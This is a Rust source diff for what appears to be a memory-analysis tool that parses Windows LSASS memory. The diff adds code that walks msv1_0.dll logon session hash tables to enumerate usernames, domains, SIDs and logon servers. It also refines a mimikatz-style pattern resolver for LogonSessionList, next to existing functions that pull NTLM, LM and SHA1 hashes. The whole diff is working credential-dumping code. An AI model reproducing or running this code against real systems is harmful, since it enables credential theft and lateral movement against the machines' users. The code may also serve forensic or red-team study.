@@ -15,6 +15,18 @@ struct MsvOffsets {
     credentials_ptr: u64,
 }
 
+/// Session metadata discovered during MSV list walk (returned even when creds are paged).
+pub struct MsvSessionInfo {
+    pub luid: u64,
+    pub username: String,
+    pub domain: String,
+    pub logon_type: u32,
+    pub session_id: u32,
+    pub logon_time: u64,
+    pub logon_server: String,
+    pub sid: String,
+}
+
 // Multiple MSV1_0_LIST variants to try (depends on exact Windows 10 build).
 // Offsets differ significantly between builds.
 // credentials_ptr = 0 means "auto-detect by scanning for Primary signature".
@@ -54,6 +66,306 @@ const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
     // No isIso, no DPAPIProtected. Hashes directly after UserName.
     PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
 ];
+
+/// Extract MSV1_0 sessions (always) and credentials (when available) from msv1_0.dll.
+/// Returns sessions even when credentials are paged out.
+pub fn extract_msv_sessions(
+    vmem: &impl VirtualMemory,
+    msv_base: u64,
+    msv_size: u32,
+) -> Vec<MsvSessionInfo> {
+    let pe = match PeHeaders::parse_from_memory(vmem, msv_base) {
+        Ok(p) => p,
+        Err(_) => return Vec::new(),
+    };
+
+    let text = match pe.find_section(".text") {
+        Some(s) => s,
+        None => return Vec::new(),
+    };
+    let text_base = msv_base + text.virtual_address as u64;
+
+    // Find LogonSessionList (hash table) via pattern or data scan.
+    // The pattern resolves both the list base address and the bucket count.
+    let (list_base, bucket_count) = match patterns::find_pattern(
+        vmem, text_base, text.virtual_size,
+        patterns::MSV_LOGON_SESSION_PATTERNS, "msv_LogonSessionList_sessions",
+    ) {
+        Ok((pattern_addr, _)) => match find_list_addr_and_count(vmem, pattern_addr) {
+            Ok((addr, count)) => (Some(addr), count),
+            Err(_) => (None, 0),
+        },
+        Err(_) => (None, 0),
+    };
+
+    let _ = msv_size; // Used in full credential extraction
+
+    let mut sessions = Vec::new();
+    let mut seen_luids = std::collections::HashSet::new();
+
+    // Walk all buckets of the pattern-resolved hash table
+    if let Some(base) = list_base {
+        log::info!("MSV session discovery: list=0x{:x} buckets={}", base, bucket_count);
+        for offsets in MSV_OFFSET_VARIANTS {
+            let variant_start = sessions.len();
+            for bucket_idx in 0..bucket_count {
+                let bucket_addr = base + (bucket_idx as u64) * 16;
+                let head_flink = match vmem.read_virt_u64(bucket_addr) {
+                    Ok(f) => f,
+                    Err(_) => continue,
+                };
+                if head_flink == 0 || head_flink == bucket_addr {
+                    continue;
+                }
+
+                let mut current = head_flink;
+                let mut visited = std::collections::HashSet::new();
+
+                for _ in 0..256 {
+                    if current == bucket_addr || visited.contains(&current) || current == 0 {
+                        break;
+                    }
+                    visited.insert(current);
+
+                    let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+                    let username = vmem.read_win_unicode_string(current + offsets.username).unwrap_or_default();
+                    let domain = vmem.read_win_unicode_string(current + offsets.domain).unwrap_or_default();
+
+                    if !username.is_empty() && luid != 0 && !seen_luids.contains(&luid) {
+                        seen_luids.insert(luid);
+                        let (logon_type, session_id, logon_time, logon_server, sid) =
+                            extract_session_metadata(vmem, current, offsets);
+                        sessions.push(MsvSessionInfo {
+                            luid, username, domain, logon_type, session_id,
+                            logon_time, logon_server, sid,
+                        });
+                    }
+
+                    current = match vmem.read_virt_u64(current + offsets.flink) {
+                        Ok(f) => f,
+                        Err(_) => break,
+                    };
+                }
+            }
+            if sessions.len() > variant_start {
+                log::info!("MSV sessions: variant luid=0x{:x} found {} sessions across {} buckets",
+                    offsets.luid, sessions.len() - variant_start, bucket_count);
+                break;
+            }
+        }
+    }
+
+    // Also try .data scan candidates (single list heads) if pattern didn't find enough
+    if sessions.len() < 3 {
+        let list_addrs = find_all_logon_session_list_candidates(vmem, &pe, msv_base).unwrap_or_default();
+
+        for list_addr in &list_addrs {
+            for offsets in MSV_OFFSET_VARIANTS {
+                let head_flink = match vmem.read_virt_u64(*list_addr) {
+                    Ok(f) => f,
+                    Err(_) => continue,
+                };
+                if head_flink == 0 || head_flink == *list_addr {
+                    continue;
+                }
+
+                let mut current = head_flink;
+                let mut visited = std::collections::HashSet::new();
+                let mut found_any = false;
+
+                for _ in 0..256 {
+                    if current == *list_addr || visited.contains(&current) || current == 0 {
+                        break;
+                    }
+                    visited.insert(current);
+
+                    let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+                    let username = vmem.read_win_unicode_string(current + offsets.username).unwrap_or_default();
+                    let domain = vmem.read_win_unicode_string(current + offsets.domain).unwrap_or_default();
+
+                    if !username.is_empty() && luid != 0 && !seen_luids.contains(&luid) {
+                        found_any = true;
+                        seen_luids.insert(luid);
+                        let (logon_type, session_id, logon_time, logon_server, sid) =
+                            extract_session_metadata(vmem, current, offsets);
+                        sessions.push(MsvSessionInfo {
+                            luid, username, domain, logon_type, session_id,
+                            logon_time, logon_server, sid,
+                        });
+                    }
+
+                    current = match vmem.read_virt_u64(current + offsets.flink) {
+                        Ok(f) => f,
+                        Err(_) => break,
+                    };
+                }
+
+                if found_any {
+                    break;
+                }
+            }
+        }
+    }
+
+    // Always try hash table walk to discover sessions in other buckets.
+    // The linked list walk above may only traverse one bucket; the hash table walk covers all.
+    {
+        let pre_count = sessions.len();
+        if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base) {
+            for (table_addr, bucket_count) in &tables {
+                for offsets in MSV_OFFSET_VARIANTS {
+                    let variant_start = sessions.len();
+                    for bucket_idx in 0..*bucket_count {
+                        let bucket_addr = *table_addr + (bucket_idx as u64) * 16;
+                        let flink = match vmem.read_virt_u64(bucket_addr) {
+                            Ok(f) => f,
+                            Err(_) => continue,
+                        };
+                        if flink == bucket_addr || flink == 0 {
+                            continue;
+                        }
+                        let mut current = flink;
+                        let mut visited = std::collections::HashSet::new();
+                        loop {
+                            if current == bucket_addr || visited.contains(&current) || current == 0 {
+                                break;
+                            }
+                            visited.insert(current);
+                            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+                            let username = vmem.read_win_unicode_string(current + offsets.username).unwrap_or_default();
+                            let domain = vmem.read_win_unicode_string(current + offsets.domain).unwrap_or_default();
+                            if !username.is_empty() && luid != 0 && !seen_luids.contains(&luid) {
+                                seen_luids.insert(luid);
+                                let (logon_type, session_id, logon_time, logon_server, sid) =
+                                    extract_session_metadata(vmem, current, offsets);
+                                sessions.push(MsvSessionInfo {
+                                    luid, username, domain, logon_type, session_id,
+                                    logon_time, logon_server, sid,
+                                });
+                            }
+                            current = match vmem.read_virt_u64(current + offsets.flink) {
+                                Ok(f) => f,
+                                Err(_) => break,
+                            };
+                        }
+                    }
+                    // If this variant found new sessions, it's the right one for this table
+                    if sessions.len() > variant_start {
+                        break;
+                    }
+                }
+            }
+        }
+        if sessions.len() > pre_count {
+            log::info!("Hash table walk found {} additional sessions", sessions.len() - pre_count);
+        }
+    }
+
+    sessions
+}
+
+/// Extract session metadata from an MSV list entry.
+fn extract_session_metadata(
+    vmem: &impl VirtualMemory,
+    entry_addr: u64,
+    offsets: &MsvOffsets,
+) -> (u32, u32, u64, String, String) {
+    let logon_type: u32;
+    let session_id: u32;
+    let logon_time: u64;
+    let logon_server: String;
+    let sid: String;
+
+    if offsets.luid == 0x2C {
+        // NlpActiveLogon layout (Win10 19041+/22H2):
+        //   +0x00: Flink/Blink (16B)
+        //   +0x2C: LUID (8B), +0x34: LogonType (4B), +0x38: field2 (4B)
+        //   +0x48: Username (UNICODE_STRING 16B), +0x58: Domain, +0x68: LogonServer
+        //   +0x88: SID embedded (not pointer)
+        // LogonTime not available in this structure variant.
+        logon_type = vmem.read_virt_u32(entry_addr + 0x34).unwrap_or(0);
+        session_id = vmem.read_virt_u32(entry_addr + 0x38).unwrap_or(0);
+        logon_time = 0; // Not stored in NlpActiveLogon
+        logon_server = vmem.read_win_unicode_string(entry_addr + 0x68).unwrap_or_default();
+        sid = read_sid_embedded(vmem, entry_addr + 0x88);
+    } else if offsets.luid == 0x90 {
+        // MSV1_0_LIST_63 extended (Win10 1607+)
+        logon_type = vmem.read_virt_u32(entry_addr + 0x80).unwrap_or(0);
+        session_id = vmem.read_virt_u32(entry_addr + 0x84).unwrap_or(0);
+        logon_time = vmem.read_virt_u64(entry_addr + 0x88).unwrap_or(0);
+        logon_server = vmem.read_win_unicode_string(entry_addr + 0xC8).unwrap_or_default();
+        sid = read_sid_string(vmem, entry_addr + 0x98);
+    } else if offsets.luid == 0x70 {
+        // MSV1_0_LIST_63 base / MSV1_0_LIST_62
+        logon_type = vmem.read_virt_u32(entry_addr + 0x60).unwrap_or(0);
+        session_id = vmem.read_virt_u32(entry_addr + 0x64).unwrap_or(0);
+        logon_time = vmem.read_virt_u64(entry_addr + 0x68).unwrap_or(0);
+        logon_server = vmem.read_win_unicode_string(entry_addr + 0xA8).unwrap_or_default();
+        sid = read_sid_string(vmem, entry_addr + 0x78);
+    } else {
+        // Win7 or unknown - minimal metadata
+        logon_type = 0;
+        session_id = 0;
+        logon_time = 0;
+        logon_server = String::new();
+        sid = String::new();
+    }
+
+    (logon_type, session_id, logon_time, logon_server, sid)
+}
+
+/// Read a SID from a pointer and format as "S-1-5-21-..."
+fn read_sid_string(vmem: &impl VirtualMemory, ptr_addr: u64) -> String {
+    let sid_ptr = match vmem.read_virt_u64(ptr_addr) {
+        Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+        _ => return String::new(),
+    };
+    // SID structure: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthority(4*count)
+    let header = match vmem.read_virt_bytes(sid_ptr, 8) {
+        Ok(h) => h,
+        Err(_) => return String::new(),
+    };
+    let revision = header[0];
+    let sub_count = header[1] as usize;
+    if revision != 1 || sub_count == 0 || sub_count > 15 {
+        return String::new();
+    }
+    let authority = u64::from_be_bytes([0, 0, header[2], header[3], header[4], header[5], header[6], header[7]]);
+    let sub_data = match vmem.read_virt_bytes(sid_ptr + 8, sub_count * 4) {
+        Ok(d) => d,
+        Err(_) => return String::new(),
+    };
+    let mut s = format!("S-{}-{}", revision, authority);
+    for i in 0..sub_count {
+        let sub = u32::from_le_bytes([sub_data[i*4], sub_data[i*4+1], sub_data[i*4+2], sub_data[i*4+3]]);
+        s.push_str(&format!("-{}", sub));
+    }
+    s
+}
+
+/// Read a SID embedded directly in a structure (not via pointer).
+fn read_sid_embedded(vmem: &impl VirtualMemory, sid_addr: u64) -> String {
+    let header = match vmem.read_virt_bytes(sid_addr, 8) {
+        Ok(h) => h,
+        Err(_) => return String::new(),
+    };
+    let revision = header[0];
+    let sub_count = header[1] as usize;
+    if revision != 1 || sub_count == 0 || sub_count > 15 {
+        return String::new();
+    }
+    let authority = u64::from_be_bytes([0, 0, header[2], header[3], header[4], header[5], header[6], header[7]]);
+    let sub_data = match vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) {
+        Ok(d) => d,
+        Err(_) => return String::new(),
+    };
+    let mut s = format!("S-{}-{}", revision, authority);
+    for i in 0..sub_count {
+        let sub = u32::from_le_bytes([sub_data[i*4], sub_data[i*4+1], sub_data[i*4+2], sub_data[i*4+3]]);
+        s.push_str(&format!("-{}", sub));
+    }
+    s
+}
 
 /// Extract MSV1_0 credentials (NTLM hashes) from msv1_0.dll.
 pub fn extract_msv_credentials(
@@ -654,20 +966,69 @@ fn walk_hash_table(
 
 use crate::lsass::patterns::is_heap_ptr;
 
-fn find_list_addr(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
-    // Search for LEA instruction (48 8D 0D / 48 8D 15 / 4C 8D 05) after pattern
+/// Find LogonSessionList and LogonSessionListCount from pattern.
+/// Returns (list_addr, bucket_count). After the pattern, mimikatz resolves
+/// two LEA instructions: one for the list (array of LIST_ENTRY heads) and
+/// one for the count (DWORD). We find all LEAs and identify which is which.
+fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<(u64, usize)> {
     let data = vmem.read_virt_bytes(pattern_addr, 0x80)?;
-    for i in 0..data.len().saturating_sub(6) {
+    let mut lea_addrs = Vec::new();
+
+    let mut i = 0;
+    while i < data.len().saturating_sub(6) {
         let is_lea = (data[i] == 0x48 && data[i + 1] == 0x8D && (data[i + 2] == 0x0D || data[i + 2] == 0x15))
             || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x05)
             || (data[i] == 0x4C && data[i + 1] == 0x8D && data[i + 2] == 0x0D);
         if is_lea {
-            return patterns::resolve_rip_relative(vmem, pattern_addr + i as u64, 3);
+            if let Ok(addr) = patterns::resolve_rip_relative(vmem, pattern_addr + i as u64, 3) {
+                lea_addrs.push(addr);
+            }
+            i += 7; // Skip past this LEA
+        } else {
+            i += 1;
         }
     }
-    Err(crate::error::GovmemError::PatternNotFound(
-        "LEA for LogonSessionList".to_string(),
-    ))
+
+    if lea_addrs.is_empty() {
+        return Err(crate::error::GovmemError::PatternNotFound(
+            "LEA for LogonSessionList".to_string(),
+        ));
+    }
+
+    // Identify which LEA is the count (DWORD) and which is the list (pointer array).
+    // The count is a small DWORD (typically 64). The list contains LIST_ENTRY heads.
+    let mut list_addr = None;
+    let mut count = 0usize;
+
+    for &addr in &lea_addrs {
+        let val = vmem.read_virt_u32(addr).unwrap_or(0);
+        // LogonSessionListCount is typically 64 or another small power-of-2
+        if val >= 4 && val <= 256 {
+            count = val as usize;
+            log::info!("LogonSessionListCount at 0x{:x} = {}", addr, val);
+        } else {
+            // Check if it looks like a LIST_ENTRY head (Flink should be a heap or self ptr)
+            let flink = vmem.read_virt_u64(addr).unwrap_or(0);
+            if flink != 0 && (is_heap_ptr(flink) || flink == addr) {
+                list_addr = Some(addr);
+                log::info!("LogonSessionList at 0x{:x} (flink=0x{:x})", addr, flink);
+            }
+        }
+    }
+
+    let list = list_addr.ok_or_else(|| {
+        crate::error::GovmemError::PatternNotFound("LogonSessionList address".to_string())
+    })?;
+
+    if count == 0 {
+        count = 1; // Fallback: treat as single list head
+    }
+
+    Ok((list, count))
+}
+
+fn find_list_addr(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
+    find_list_addr_and_count(vmem, pattern_addr).map(|(addr, _)| addr)
 }
 
 /// Result of extracting primary credentials (NTLM hashes).
